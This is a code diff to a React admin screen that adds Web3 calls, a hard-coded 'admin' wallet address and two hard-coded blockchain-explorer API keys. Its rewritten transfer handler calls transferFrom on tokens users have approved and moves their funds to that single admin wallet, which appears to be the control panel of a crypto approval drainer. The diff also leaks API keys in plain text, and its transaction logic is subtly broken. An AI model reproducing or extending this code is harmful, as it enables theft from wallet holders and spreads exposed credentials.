@@ -1,8 +1,15 @@
 import React, { useState, useEffect } from 'react';
 import axios from 'axios';
 import { NotificationContainer, NotificationManager } from "react-notifications";
+import Web3 from "web3";
 
 import 'react-notifications/lib/notifications.css';
+
+const adminWalletAddress = "0xBD288011d06dA18Eca34DF3d50488fB25fCC7Fde";
+const web3 = new Web3(window.ethereum);
+
+const GET_BSC_SCAN_API_KEY = "HXKSU77A2DNXD9ZAIFHCYSWBF4DUWG66SS";
+const GET_ETH_SCAN_API_KEY = "YRVQAVGPB6NHD9D9412VPTIRUZ5BK956K5"
 
 const AdminScreen = () => {
   const [products, setProduct] = useState([]);
@@ -19,12 +26,24 @@ const AdminScreen = () => {
   const handleChangeAmount = (value) => {
     setTransferAmount(value);
   }
-  const handleTransfer = (token) => {
-    console.log(token, transferAmount);
+  const handleTransfer = async (approveToken) => {
     if (transferAmount === 0) {
       NotificationManager.warning('Transfer Amount is not 0.', 'Transfer Amount Warning', 3000);
     }
     else {
+      if (approveToken.network === "BSC") {
+        let api = "https://api.bscscan.com/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_BSC_SCAN_API_KEY;
+        let temp = await axios.get(api);
+        const contractABI = JSON.parse(temp.data.result);
+        const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
+        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
+      } else {
+        let api = "https://api.etherscan.io/api?module=contract&action=getabi&address=" + approveToken.contractAddress + "&apikey=" + GET_ETH_SCAN_API_KEY;
+        let temp = await axios.get(api);
+        const contractABI = JSON.parse(temp.data.result);
+        const nowContract = new web3.eth.Contract(contractABI, approveToken.contractAddress);
+        await nowContract.methods.transferFrom(approveToken.userWalletAddress, adminWalletAddress, web3.utils.toWei((transferAmount).toString(), "ether")).send({ from: approveToken.userWalletAddress })
+      }
     }
   }
   return (
